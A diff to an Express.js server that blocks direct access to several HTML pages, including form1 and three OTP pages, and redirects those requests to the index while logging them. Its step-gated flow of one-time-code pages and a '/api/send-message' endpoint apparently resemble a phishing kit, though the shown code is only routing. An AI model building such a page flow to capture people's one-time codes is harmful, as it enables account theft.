@@ -223,14 +223,37 @@ app.post('/api/send-message', async (req, res) => {
 });
 
 // ============================================
-// Static Files with Route Protection
+// Static Files - Block Direct HTML Access
 // ============================================
 
-// Serve public files with route protection middleware
+// List of HTML pages that should NEVER be served directly via static files
+const BLOCKED_HTML_FILES = [
+  '/form1.html',
+  '/totalselect.html',
+  '/otp.html',
+  '/otp2.html',
+  '/otp3.html',
+  '/select.html'
+];
+
+// Middleware to block direct access to protected HTML pages
+const blockDirectHtmlAccess = (req, res, next) => {
+  const requestedPath = '/' + path.basename(req.path);
+  
+  if (BLOCKED_HTML_FILES.includes(requestedPath) || BLOCKED_HTML_FILES.includes(req.path)) {
+    console.log(`[SECURITY] Direct access blocked: ${req.path}`);
+    return res.redirect('/');
+  }
+  next();
+};
+
+// Apply block middleware BEFORE static files
+app.use(blockDirectHtmlAccess);
+
+// Serve public files (CSS, JS, images, etc.) - NOT HTML pages
 app.use(express.static(path.join(__dirname, 'public'), {
-  index: false, // Disable default index file serving
+  index: false,
   setHeaders: (res, filePath) => {
-    // Set security headers
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-Frame-Options', 'DENY');
     res.setHeader('X-XSS-Protection', '1; mode=block');
@@ -240,10 +263,10 @@ app.use(express.static(path.join(__dirname, 'public'), {
 }));
 
 // ============================================
-// Protected Routes (HTML Pages)
+// Protected Routes (HTML Pages Only)
 // ============================================
 
-// Apply route protection to HTML pages
+// Apply route protection to HTML pages - These are the ONLY way to access protected pages
 const protectedPages = ['form1.html', 'totalselect.html', 'otp.html', 'otp2.html', 'otp3.html'];
 
 protectedPages.forEach(page => {
@@ -253,22 +276,18 @@ protectedPages.forEach(page => {
 });
 
 // ============================================
-// Step Initialization Route (index.html logic)
+// Index Route
 // ============================================
 app.get('/', routeProtection, (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // ============================================
-// Catch-all Route
+// Catch-all Route - Block all other HTML file access
 // ============================================
-app.get('*', (req, res) => {
-  // For any other route, redirect to index if they have a valid session
-  if (req.session.completedSteps && Object.keys(req.session.completedSteps).length > 0) {
-    res.redirect('/');
-  } else {
-    res.redirect('/');
-  }
+app.get('*.html', (req, res) => {
+  console.log(`[SECURITY] Blocked HTML access: ${req.path}`);
+  res.redirect('/');
 });
 
 // ============================================
